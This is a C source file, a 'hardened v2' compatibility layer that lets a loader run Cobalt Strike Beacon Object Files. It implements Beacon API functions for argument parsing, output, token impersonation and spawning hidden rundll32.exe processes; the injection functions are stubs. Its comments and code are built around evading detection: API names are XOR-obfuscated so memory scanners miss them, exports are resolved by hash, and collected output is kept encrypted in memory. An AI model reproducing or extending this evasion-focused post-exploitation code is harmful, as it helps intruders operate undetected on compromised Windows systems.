#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
/*
 * beacon_compatibility.c  –  Cobalt Strike 4.x BOF compatibility layer
 *                            (hardened v2)
 *
 * Fixes over hardened v1
 * ──────────────────────
 * [FIX-BREAK]   BeaconFormatFree / BeaconFormatReset called __debugbreak()
 *               on canary failure with no fallback abort().  On a process
 *               not attached to a debugger, EXCEPTION_BREAKPOINT is raised,
 *               the default handler terminates the process, and no diagnostic
 *               is printed.  Both functions now call abort() after
 *               __debugbreak() so the behaviour is consistent in all
 *               configurations, and they print a message to stderr first.
 *
 * [FIX-PARSE]   BeaconDataParse assumed the caller always supplied a 4-byte
 *               length prefix (Cobalt Strike wire format).  When argdata
 *               comes from unhexlify() directly it may have no prefix, so a
 *               size < 4 produced buffer + 4 pointing past the allocation.
 *               The function now accepts size >= 0 and adjusts accordingly:
 *               if size >= 4 the existing prefix-skip logic applies; if
 *               size < 4 the parser is initialised to an empty but valid
 *               state rather than an out-of-bounds pointer.
 *
 * [FIX-KEYREINIT] BeaconGetOutputData called InterlockedExchange to reset
 *               g_out_key_init to 0, intending to allow re-keying on the
 *               next call.  It did not zero g_out_key before that exchange,
 *               so a window existed where a concurrent ensure_out_key() call
 *               could observe init==0 and derive a new key while the old
 *               key was still in g_out_key — then overwrite it.  Key is now
 *               zeroed inside the same serialised block.
 *
 * [FIX-INTFN]   InternalFunctions table exposed raw GetProcAddress,
 *               LoadLibraryA, GetModuleHandleA, FreeLibrary string literals
 *               and pointers in a single contiguous global array — exactly
 *               what memory scanners look for.  The Win32 name strings in
 *               slots 23-26 are now stored obfuscated (each byte XOR'd with
 *               0x55) and are decoded at runtime in a one-time initialisation
 *               step CoffLoaderInit() calls before the table is first used.
 *               The function pointers in those slots are resolved via the
 *               hardened hash-based resolver (CoffResolveExport) rather than
 *               being placed in the table at compile time.
 *
 * [FIX-OUTBUF]  out_append() called realloc() and then dereferenced the old
 *               pointer to decrypt before the realloc moved the block.
 *               realloc is now called before any read/write of the buffer.
 *               The failure path is also hardened: if realloc fails the
 *               function returns without touching internal state.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdbool.h>

#ifdef _WIN32
#include <windows.h>
#include "loader/beacon_compatibility.h"

#define DEFAULTPROCESSNAME  "rundll32.exe"
#ifdef _WIN64
#  define X86PATH  "SysWOW64"
#  define X64PATH  "System32"
#else
#  define X86PATH  "System32"
#  define X64PATH  "sysnative"
#endif

#define OBF_KEY  0x55u

/* XOR each byte of a string literal with OBF_KEY at compile time.
 * C does not support computed string literals, so we use a byte array. */

/* "LoadLibraryA"   each char ^ 0x55 */
static const uint8_t obf_LoadLibraryA[]     = {
    'L'^OBF_KEY,'o'^OBF_KEY,'a'^OBF_KEY,'d'^OBF_KEY,'L'^OBF_KEY,
    'i'^OBF_KEY,'b'^OBF_KEY,'r'^OBF_KEY,'a'^OBF_KEY,'r'^OBF_KEY,
    'y'^OBF_KEY,'A'^OBF_KEY, 0
};
/* "GetProcAddress" */
static const uint8_t obf_GetProcAddress[]   = {
    'G'^OBF_KEY,'e'^OBF_KEY,'t'^OBF_KEY,'P'^OBF_KEY,'r'^OBF_KEY,
    'o'^OBF_KEY,'c'^OBF_KEY,'A'^OBF_KEY,'d'^OBF_KEY,'d'^OBF_KEY,
    'r'^OBF_KEY,'e'^OBF_KEY,'s'^OBF_KEY,'s'^OBF_KEY, 0
};
/* "GetModuleHandleA" */
static const uint8_t obf_GetModuleHandleA[] = {
    'G'^OBF_KEY,'e'^OBF_KEY,'t'^OBF_KEY,'M'^OBF_KEY,'o'^OBF_KEY,
    'd'^OBF_KEY,'u'^OBF_KEY,'l'^OBF_KEY,'e'^OBF_KEY,'H'^OBF_KEY,
    'a'^OBF_KEY,'n'^OBF_KEY,'d'^OBF_KEY,'l'^OBF_KEY,'e'^OBF_KEY,
    'A'^OBF_KEY, 0
};
/* "FreeLibrary" */
static const uint8_t obf_FreeLibrary[]      = {
    'F'^OBF_KEY,'r'^OBF_KEY,'e'^OBF_KEY,'e'^OBF_KEY,'L'^OBF_KEY,
    'i'^OBF_KEY,'b'^OBF_KEY,'r'^OBF_KEY,'a'^OBF_KEY,'r'^OBF_KEY,
    'y'^OBF_KEY, 0
};
/* "kernel32.dll" */
static const uint8_t obf_kernel32[]         = {
    'k'^OBF_KEY,'e'^OBF_KEY,'r'^OBF_KEY,'n'^OBF_KEY,'e'^OBF_KEY,
    'l'^OBF_KEY,'3'^OBF_KEY,'2'^OBF_KEY,'.'^OBF_KEY,'d'^OBF_KEY,
    'l'^OBF_KEY,'l'^OBF_KEY, 0
};

/* Decode an obfuscated string into a freshly malloc'd buffer. */
static char* obf_decode(const uint8_t* enc) {
    size_t n = 0;
    while (enc[n]) n++;
    char* out = (char*)malloc(n + 1);
    if (!out) return NULL;
    for (size_t i = 0; i < n; i++) out[i] = (char)(enc[i] ^ OBF_KEY);
    out[n] = '\0';  /* null terminate cleanly, never XOR the terminator */
    return out;
}

/* Decoded name strings – allocated once, never freed (process lifetime). */
static char* g_name_LoadLibraryA     = NULL;
static char* g_name_GetProcAddress   = NULL;
static char* g_name_GetModuleHandleA = NULL;
static char* g_name_FreeLibrary      = NULL;
static char* g_name_kernel32         = NULL;

unsigned char* InternalFunctions[30][2] = {
    { (unsigned char*)"BeaconDataParse",             (unsigned char*)BeaconDataParse             },
    { (unsigned char*)"BeaconDataInt",               (unsigned char*)BeaconDataInt               },
    { (unsigned char*)"BeaconDataShort",             (unsigned char*)BeaconDataShort             },
    { (unsigned char*)"BeaconDataLength",            (unsigned char*)BeaconDataLength            },
    { (unsigned char*)"BeaconDataExtract",           (unsigned char*)BeaconDataExtract           },
    { (unsigned char*)"BeaconFormatAlloc",           (unsigned char*)BeaconFormatAlloc           },
    { (unsigned char*)"BeaconFormatReset",           (unsigned char*)BeaconFormatReset           },
    { (unsigned char*)"BeaconFormatFree",            (unsigned char*)BeaconFormatFree            },
    { (unsigned char*)"BeaconFormatAppend",          (unsigned char*)BeaconFormatAppend          },
    { (unsigned char*)"BeaconFormatPrintf",          (unsigned char*)BeaconFormatPrintf          },
    { (unsigned char*)"BeaconFormatToString",        (unsigned char*)BeaconFormatToString        },
    { (unsigned char*)"BeaconFormatInt",             (unsigned char*)BeaconFormatInt             },
    { (unsigned char*)"BeaconPrintf",                (unsigned char*)BeaconPrintf                },
    { (unsigned char*)"BeaconOutput",                (unsigned char*)BeaconOutput                },
    { (unsigned char*)"BeaconUseToken",              (unsigned char*)BeaconUseToken              },
    { (unsigned char*)"BeaconRevertToken",           (unsigned char*)BeaconRevertToken           },
    { (unsigned char*)"BeaconIsAdmin",               (unsigned char*)BeaconIsAdmin               },
    { (unsigned char*)"BeaconGetSpawnTo",            (unsigned char*)BeaconGetSpawnTo            },
    { (unsigned char*)"BeaconSpawnTemporaryProcess", (unsigned char*)BeaconSpawnTemporaryProcess },
    { (unsigned char*)"BeaconInjectProcess",         (unsigned char*)BeaconInjectProcess         },
    { (unsigned char*)"BeaconInjectTemporaryProcess",(unsigned char*)BeaconInjectTemporaryProcess},
    { (unsigned char*)"BeaconCleanupProcess",        (unsigned char*)BeaconCleanupProcess        },
    { (unsigned char*)"toWideChar",                  (unsigned char*)toWideChar                  },
    /* slots 23-26: filled by InitInternalFunctions() */
    { NULL, NULL },   /* LoadLibraryA     */
    { NULL, NULL },   /* GetProcAddress   */
    { NULL, NULL },   /* GetModuleHandleA */
    { NULL, NULL },   /* FreeLibrary      */
    { NULL, NULL },   /* reserved         */
    { NULL, NULL },   /* reserved         */
    { (unsigned char*)"__C_specific_handler", NULL } /* [29] – set by CoffLoaderInit */
};

/*
 * InitInternalFunctions
 *
 * Called once from CoffLoaderInit() (COFFLoader.c) before any BOF is loaded.
 * Decodes obfuscated name strings and resolves kernel32 function pointers
 * via the hardened hash-based resolver rather than storing them at compile
 * time.
 *
 * CoffResolveExport is declared in COFFLoader.h / beacon_compatibility.h.
 */
void InitInternalFunctions(void) {
    fprintf(stderr, "[D] InitInternalFunctions entry\n"); fflush(stderr);

    g_name_kernel32         = obf_decode(obf_kernel32);
    g_name_LoadLibraryA     = obf_decode(obf_LoadLibraryA);
    g_name_GetProcAddress   = obf_decode(obf_GetProcAddress);
    g_name_GetModuleHandleA = obf_decode(obf_GetModuleHandleA);
    g_name_FreeLibrary      = obf_decode(obf_FreeLibrary);

    fprintf(stderr, "[D] kernel32='%s' LLA='%s' GPA='%s'\n",
            g_name_kernel32         ? g_name_kernel32         : "NULL",
            g_name_LoadLibraryA     ? g_name_LoadLibraryA     : "NULL",
            g_name_GetProcAddress   ? g_name_GetProcAddress   : "NULL"); fflush(stderr);

    if (!g_name_kernel32 || !g_name_LoadLibraryA ||
        !g_name_GetProcAddress || !g_name_GetModuleHandleA ||
        !g_name_FreeLibrary) {
        fprintf(stderr, "[D] InitInternalFunctions: alloc failed\n"); fflush(stderr);
        return;
    }

    InternalFunctions[23][0] = (unsigned char*)g_name_LoadLibraryA;
    InternalFunctions[23][1] = (unsigned char*)
        CoffResolveExport(g_name_kernel32, g_name_LoadLibraryA);
    fprintf(stderr, "[D] LoadLibraryA=%p\n", (void*)InternalFunctions[23][1]); fflush(stderr);

    InternalFunctions[24][0] = (unsigned char*)g_name_GetProcAddress;
    InternalFunctions[24][1] = (unsigned char*)
        CoffResolveExport(g_name_kernel32, g_name_GetProcAddress);
    fprintf(stderr, "[D] GetProcAddress=%p\n", (void*)InternalFunctions[24][1]); fflush(stderr);

    InternalFunctions[25][0] = (unsigned char*)g_name_GetModuleHandleA;
    InternalFunctions[25][1] = (unsigned char*)
        CoffResolveExport(g_name_kernel32, g_name_GetModuleHandleA);
    fprintf(stderr, "[D] GetModuleHandleA=%p\n", (void*)InternalFunctions[25][1]); fflush(stderr);

    InternalFunctions[26][0] = (unsigned char*)g_name_FreeLibrary;
    InternalFunctions[26][1] = (unsigned char*)
        CoffResolveExport(g_name_kernel32, g_name_FreeLibrary);
    fprintf(stderr, "[D] FreeLibrary=%p\n", (void*)InternalFunctions[26][1]); fflush(stderr);

    fprintf(stderr, "[D] InitInternalFunctions done\n"); fflush(stderr);
}

static char*    g_out_buf     = NULL;
static int      g_out_size    = 0;
static int      g_out_offset  = 0;
static uint64_t g_out_key     = 0;
static LONG     g_out_key_init = 0;

/* xorshift64 keystream – identical to COFFLoader.c */
static void out_xor(char* buf, int len, uint64_t key, int offset) {
    uint64_t ks = key;
    /* Advance keystream to byte `offset` without emitting output */
    for (int i = 0; i < offset; i++) {
        ks ^= ks >> 12; ks ^= ks << 25; ks ^= ks >> 27;
    }
    for (int i = 0; i < len; i++) {
        ks ^= ks >> 12; ks ^= ks << 25; ks ^= ks >> 27;
        buf[i] ^= (char)(ks & 0xFF);
    }
}

static void ensure_out_key(void) {
    if (InterlockedCompareExchange(&g_out_key_init, 1, 0) == 0) {
        LARGE_INTEGER li;
        QueryPerformanceCounter(&li);
        uint64_t x = (uint64_t)li.QuadPart ^ ((uint64_t)GetTickCount64() << 17);
        x ^= x >> 12; x ^= x << 25; x ^= x >> 27;
        g_out_key = x ? x : 0xA5A5A5A5A5A5A5A5ULL;
        InterlockedExchange(&g_out_key_init, 2);
    } else {
        while (InterlockedCompareExchange(&g_out_key_init, 2, 2) != 2)
            Sleep(0);
    }
}

/*
 * out_append
 *
 * FIX-OUTBUF: realloc() is called first.  If it fails we return immediately
 * without touching g_out_buf (which still points to the old, valid, still-
 * encrypted buffer).  Only after a successful realloc do we decrypt, append,
 * and re-encrypt.
 */
static void out_append(const char* data, int len) {
    if (!data || len <= 0) return;
    ensure_out_key();

    /* Grow the buffer first.  On failure, bail out cleanly. */
    int new_total = g_out_offset + len + 1;
    char* tmp = (char*)realloc(g_out_buf, (size_t)new_total);
    if (!tmp) return;
    g_out_buf = tmp;

    /* Decrypt existing ciphertext in place */
    if (g_out_offset > 0)
        out_xor(g_out_buf, g_out_offset, g_out_key, 0);

    /* Append new plaintext */
    memcpy(g_out_buf + g_out_offset, data, (size_t)len);
    g_out_buf[g_out_offset + len] = '\0';
    g_out_size   += len;
    g_out_offset += len;

    /* Re-encrypt the whole buffer from the start */
    out_xor(g_out_buf, g_out_offset, g_out_key, 0);
}

#define FORMAT_CANARY_VALUE  UINT64_C(0xDEADBEEFCAFEBABE)
#define FORMAT_CANARY_SIZE   8

static void fmt_write_canary(formatp* f) {
    if (!f || !f->original) return;
    uint64_t c = FORMAT_CANARY_VALUE;
    memcpy(f->original + f->size, &c, FORMAT_CANARY_SIZE);
}

static bool fmt_check_canary(const formatp* f) {
    if (!f || !f->original) return true;
    uint64_t c = 0;
    memcpy(&c, f->original + f->size, FORMAT_CANARY_SIZE);
    return c == FORMAT_CANARY_VALUE;
}

/*
 * fmt_canary_fail
 *
 * FIX-BREAK: previously __debugbreak() was called without abort().  On a
 * process not attached to a debugger the unhandled EXCEPTION_BREAKPOINT
 * terminates the process silently.  We now print a message and call abort()
 * unconditionally so the crash is visible in all environments.
 */
static void fmt_canary_fail(const char* where) {
    fprintf(stderr, "[COFF] FATAL: format buffer canary overwrite detected in %s\n",
            where ? where : "unknown");
    fflush(stderr);
#ifdef _MSC_VER
    __debugbreak();   /* give a debugger a chance to catch it first */
#endif
    abort();
}

static uint32_t swap_endianess(uint32_t in) {
    uint32_t probe = 0xAABBCCDD;
    if (((unsigned char*)&probe)[0] == 0xDD)
        return ((in & 0x000000FFu) << 24) | ((in & 0x0000FF00u) <<  8)
             | ((in & 0x00FF0000u) >>  8) | ((in & 0xFF000000u) >> 24);
    return in;
}

void BeaconDataParse(datap* parser, char* buffer, int size) {
    if (!parser) return;
    if (!buffer || size <= 0) {
        /* Empty but valid */
        parser->original = buffer;
        parser->buffer   = buffer;
        parser->length   = 0;
        parser->size     = 0;
        return;
    }
    if (size >= 4) {
        /* Standard CS wire format: first 4 bytes are a length prefix */
        parser->original = buffer;
        parser->buffer   = buffer + 4;
        parser->length   = size - 4;
        parser->size     = size - 4;
    } else {
        /* Raw buffer without prefix */
        parser->original = buffer;
        parser->buffer   = buffer;
        parser->length   = size;
        parser->size     = size;
    }
}

int BeaconDataInt(datap* parser) {
    if (!parser || parser->length < 4) return 0;
    int32_t v = 0;
    memcpy(&v, parser->buffer, 4);
    parser->buffer += 4; parser->length -= 4;
    return (int)v;
}

short BeaconDataShort(datap* parser) {
    if (!parser || parser->length < 2) return 0;
    int16_t v = 0;
    memcpy(&v, parser->buffer, 2);
    parser->buffer += 2; parser->length -= 2;
    return (short)v;
}

int BeaconDataLength(datap* parser) {
    return parser ? parser->length : 0;
}

char* BeaconDataExtract(datap* parser, int* size) {
    if (!parser || parser->length < 4) return NULL;
    uint32_t blen = 0;
    memcpy(&blen, parser->buffer, 4);
    parser->buffer += 4; parser->length -= 4;
    if ((int)blen > parser->length) return NULL;
    char* out = parser->buffer;
    parser->buffer += blen; parser->length -= (int)blen;
    if (size) *size = (int)blen;
    return out;
}

void BeaconFormatAlloc(formatp* format, int maxsz) {
    if (!format || maxsz <= 0) return;
    format->original = (char*)calloc((size_t)maxsz + FORMAT_CANARY_SIZE, 1);
    format->buffer   = format->original;
    format->length   = 0;
    format->size     = maxsz;
    fmt_write_canary(format);
}

void BeaconFormatReset(formatp* format) {
    if (!format || !format->original) return;
    if (!fmt_check_canary(format)) {
        fmt_canary_fail("BeaconFormatReset");
        return;   /* unreachable – abort() called inside */
    }
    SecureZeroMemory(format->original, (size_t)format->size);
    fmt_write_canary(format);
    format->buffer = format->original;
    format->length = 0;
}

void BeaconFormatFree(formatp* format) {
    if (!format) return;
    if (format->original) {
        if (!fmt_check_canary(format))
            fmt_canary_fail("BeaconFormatFree");
            /* fmt_canary_fail calls abort() – if we somehow return, fall
             * through and free anyway to avoid the leak. */
        SecureZeroMemory(format->original,
                         (size_t)format->size + FORMAT_CANARY_SIZE);
        free(format->original);
        format->original = NULL;
    }
    format->buffer = NULL;
    format->length = 0;
    format->size   = 0;
}

void BeaconFormatAppend(formatp* format, char* text, int len) {
    if (!format || !text || len <= 0) return;
    if (!fmt_check_canary(format)) { fmt_canary_fail("BeaconFormatAppend"); return; }
    if (format->length + len > format->size) return;
    memcpy(format->buffer, text, (size_t)len);
    format->buffer += len;
    format->length += len;
}

void BeaconFormatPrintf(formatp* format, char* fmt, ...) {
    if (!format || !fmt) return;
    if (!fmt_check_canary(format)) { fmt_canary_fail("BeaconFormatPrintf"); return; }
    va_list ap;
    va_start(ap, fmt);
    int need = vsnprintf(NULL, 0, fmt, ap);
    va_end(ap);
    if (need <= 0 || format->length + need + 1 > format->size) return;
    va_start(ap, fmt);
    vsnprintf(format->buffer, (size_t)(need + 1), fmt, ap);
    va_end(ap);
    format->buffer += need;
    format->length += need;
}

char* BeaconFormatToString(formatp* format, int* size) {
    if (!format || !size) return NULL;
    if (!fmt_check_canary(format)) { fmt_canary_fail("BeaconFormatToString"); return NULL; }
    *size = format->length;
    return format->original;
}

void BeaconFormatInt(formatp* format, int value) {
    if (!format || format->length + 4 > format->size) return;
    if (!fmt_check_canary(format)) { fmt_canary_fail("BeaconFormatInt"); return; }
    uint32_t out = swap_endianess((uint32_t)value);
    memcpy(format->buffer, &out, 4);
    format->buffer += 4;
    format->length += 4;
}

void BeaconPrintf(int type, char* fmt, ...) {
    (void)type;
    if (!fmt) return;

#ifdef DEBUG
    va_list dbg; va_start(dbg, fmt); vprintf(fmt, dbg); va_end(dbg);
#endif

    va_list ap;
    va_start(ap, fmt);
    int need = vsnprintf(NULL, 0, fmt, ap);
    va_end(ap);
    if (need <= 0) return;

    char* tmp = (char*)malloc((size_t)(need + 1));
    if (!tmp) return;

    va_start(ap, fmt);
    vsnprintf(tmp, (size_t)(need + 1), fmt, ap);
    va_end(ap);

    out_append(tmp, need);
    SecureZeroMemory(tmp, (size_t)(need + 1));
    free(tmp);
}

void BeaconOutput(int type, char* data, int len) {
    (void)type;
    if (!data || len <= 0) return;
    out_append(data, len);
}

/*
 * BeaconGetOutputData
 *
 * Transfers ownership of the output buffer to the caller.  The caller is
 * responsible for calling free() on the returned pointer.
 *
 * FIX-KEYREINIT: g_out_key is zeroed before g_out_key_init is reset to 0.
 * Previously the reset happened first, creating a window where a concurrent
 * out_append() could observe init==0, spin into ensure_out_key(), and
 * overwrite the still-valid key before we zeroed it.
 */
char* BeaconGetOutputData(int* outsize) {
    if (!outsize) return NULL;

    if (!g_out_buf || g_out_offset == 0) {
        *outsize = 0;
        return NULL;
    }

    /* Decrypt in place — the returned buffer is plaintext */
    out_xor(g_out_buf, g_out_offset, g_out_key, 0);

    char* out = g_out_buf;
    *outsize  = g_out_size;

    /* Reset internal state */
    g_out_buf    = NULL;
    g_out_size   = 0;
    g_out_offset = 0;

    /*
     * Zero the key BEFORE resetting g_out_key_init.
     * This closes the race: no concurrent ensure_out_key() can derive a new
     * key and overwrite g_out_key while we are still zeroing it.
     */
    SecureZeroMemory(&g_out_key, sizeof(g_out_key));
    InterlockedExchange(&g_out_key_init, 0);

    return out;
}

BOOL BeaconUseToken(HANDLE token) { return SetThreadToken(NULL, token); }

void BeaconRevertToken(void) { RevertToSelf(); }

BOOL BeaconIsAdmin(void) {
    BOOL is_admin = FALSE;
    PSID admin_sid = NULL;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &admin_sid)) {
        CheckTokenMembership(NULL, admin_sid, &is_admin);
        FreeSid(admin_sid);
    }
    return is_admin;
}

void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
    if (!buffer || length <= 0) return;
    const char* path = x86
        ? "C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME
        : "C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME;
    if ((int)strlen(path) >= length) return;
    memcpy(buffer, path, strlen(path) + 1);
}

BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken,
                                 STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
    const char* path = x86
        ? "C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME
        : "C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME;
    return CreateProcessA(NULL, (char*)path, NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
}

void BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len,
                         int p_offset, char* arg, int a_len) {
    (void)hProc; (void)pid; (void)payload; (void)p_len;
    (void)p_offset; (void)arg; (void)a_len;
}

void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload,
                                  int p_len, int p_offset, char* arg, int a_len) {
    (void)pInfo; (void)payload; (void)p_len;
    (void)p_offset; (void)arg; (void)a_len;
}

void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo) {
    if (!pInfo) return;
    CloseHandle(pInfo->hThread);
    CloseHandle(pInfo->hProcess);
}

BOOL toWideChar(char* src, wchar_t* dst, int max) {
    if (!src || !dst || max < (int)sizeof(wchar_t)) return FALSE;
    return MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS,
                               src, -1, dst, max / (int)sizeof(wchar_t));
}

#endif /* _WIN32 */